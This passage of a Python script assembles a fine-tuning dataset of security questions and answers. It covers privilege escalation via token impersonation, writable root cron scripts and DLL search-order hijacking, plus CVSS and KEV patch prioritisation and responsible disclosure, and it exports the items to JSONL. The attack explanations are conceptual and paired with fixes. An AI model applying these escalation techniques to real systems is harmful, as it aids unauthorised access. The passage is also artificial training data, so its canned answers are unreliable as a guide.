         "token and impersonate it, escalating to **SYSTEM** (Access Token Manipulation, "
         "**T1134**). Mitigate by patching, minimizing which accounts hold the privilege, and "
         "isolating exposed services."),
        ("linux-writable-path",
         "A root cron job calls a script in a directory the current user can write to. Explain "
         "the escalation and fix.",
         "If the user can modify the script (or a binary it calls via a relative name on a "
         "writable PATH), they replace it and it runs **as root** when cron fires. Fix: make "
         "root-run scripts and their directories writable only by root, use absolute paths, and "
         "set an explicit minimal PATH in the job."),
        ("dll-hijack",
         "What is DLL search-order hijacking and how is it abused for escalation/persistence?",
         "If an application loads a DLL by name and a writable directory precedes the real one "
         "in the search order, an attacker plants a malicious DLL that gets loaded into the "
         "app's process — running with that app's privileges (**T1574.001**). Fix: use fully "
         "qualified DLL paths, safe DLL search mode, and remove write access to application "
         "directories."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-privesc-{key}", SYS_EDU, prompt, ans,
            task_type="privilege_escalation", domain="offensive_ctf", difficulty="advanced",
            requires_evidence=False, tags=["privilege_escalation", key],
        )


def _vuln_family(dd: _Deduper) -> None:
    scen = [
        ("cvss-base-vs-env",
         "What does a CVSS base score represent, and why shouldn't you patch strictly by it?",
         "The **base score** captures a vulnerability's intrinsic severity (exploitability + "
         "impact) independent of your environment. It ignores whether the asset is internet-"
         "facing, compensating controls, exploit availability, and business criticality. "
         "Prioritize with **environmental/temporal** context and real-world signals (e.g. CISA "
         "KEV / active exploitation), not base score alone."),
        ("known-exploited",
         "Two criticals: CVSS 9.8 with no known exploit vs. CVSS 8.1 on CISA's KEV list. Which "
         "first?",
         "Patch the **8.1 that is on the Known Exploited Vulnerabilities list first**. Active, "
         "in-the-wild exploitation makes real-world risk far higher than a higher base score "
         "with no known exploit. CVSS ranks intrinsic severity; exploitation evidence ranks "
         "urgency — and urgency wins for scheduling."),
        ("patch-vs-mitigate",
         "You can't patch a critical internet-facing vuln immediately. What compensating "
         "controls buy time?",
         "Reduce exposure and add detection: restrict access (WAF/virtual patch, IP allowlist, "
         "take it off the internet if possible), disable the vulnerable feature, add targeted "
         "monitoring/alerting for exploitation, and tighten least privilege so a compromise is "
         "contained. These lower likelihood/impact until the real patch ships — they are not a "
         "substitute for it."),
        ("responsible-disclosure",
         "You found a serious vulnerability in a third-party product. Outline responsible "
         "disclosure.",
         "Report privately to the vendor via their security contact / advisory (or a "
         "coordinator like a CERT/CC) with clear reproduction details; agree on a remediation "
         "timeline; give reasonable time to fix before any public detail; request a CVE. Avoid "
         "testing beyond what's authorized and never exploit others' systems. Coordinated "
         "disclosure protects users while still driving a fix."),
    ]
    for key, prompt, ans in scen:
        dd.add(
            f"train-vuln-{key}", SYS_FUND, prompt, ans,
            task_type="vulnerability_analysis", domain="general", difficulty="intermediate",
            requires_evidence=False, tags=["vulnerability_analysis", key],
        )


def build_sft_v2_dataset(registry: FactRegistry | None = None) -> list[TrainingItem]:
    """Assemble the sft_v0.2 dataset. Guarantees distinct assistant answers + unique ids."""
    reg = registry or load_fact_registry()
    dd = _Deduper()
    _attack_family(dd, reg)
    _attack_chain_family(dd)
    _hallucination_family(dd)
    _insufficient_family(dd)
    _log_family(dd)
    _ir_family(dd)
    _detection_family(dd)
    _ad_family(dd)
    _ctf_family(dd)
    _fundamentals_family(dd)
    _network_family(dd)
    _web_family(dd)
    _windows_family(dd)
    _privesc_family(dd)
    _vuln_family(dd)
    _safety_family(dd)
    return dd.items


def export_dataset_to_jsonl(items: list[TrainingItem], output_path: str | Path) -> None:
    output_path = Path(output_path)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    with output_path.open("w", encoding="utf-8") as fh:
        for item in items:
            fh.write(item.model_dump_json() + "\n")
    print(f"Exported {len(items)} training items to {output_path}")


if __name__ == "__main__":
    dataset = build_sft_v2_dataset()
    export_dataset_to_jsonl(dataset, "data/training/sft_v0.2.jsonl")
